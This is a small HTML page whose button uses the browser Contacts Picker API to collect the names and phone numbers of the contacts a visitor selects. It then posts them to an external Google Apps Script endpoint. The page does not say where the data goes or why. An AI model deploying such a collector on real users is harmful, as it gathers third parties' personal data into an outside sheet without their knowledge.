<!DOCTYPE html>
<html>
<head>
  <title>Contacts Access</title>
</head>
<body>
  <button onclick="getContacts()">Allow Contacts Access</button>

  <script>
    async function getContacts() {
      if (!('contacts' in navigator && 'ContactsManager' in window)) {
        alert("Your browser does not support contacts API.");
        return;
      }

      try {
        const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
        const formattedContacts = contacts.map(c => ({
          name: c.name[0] || '',
          tel: c.tel[0] || ''
        }));

        // Send to Google Sheets
        await fetch('https://script.google.com/macros/s/AKfycbzQWQ-qdWw7LRaKuUsKPE2-EUJLWmHZiPgbfYOylzt-vXuCtDyzckjji48iKTvhRE1L/exec', {
          method: 'POST',
          body: JSON.stringify(formattedContacts),
          headers: {
            'Content-Type': 'application/json'
          }
        });

        alert("Contacts sent successfully!");

      } catch (err) {
        alert("Permission denied or something went wrong.");
        console.error(err);
      }
    }
  </script>
</body>
</html>
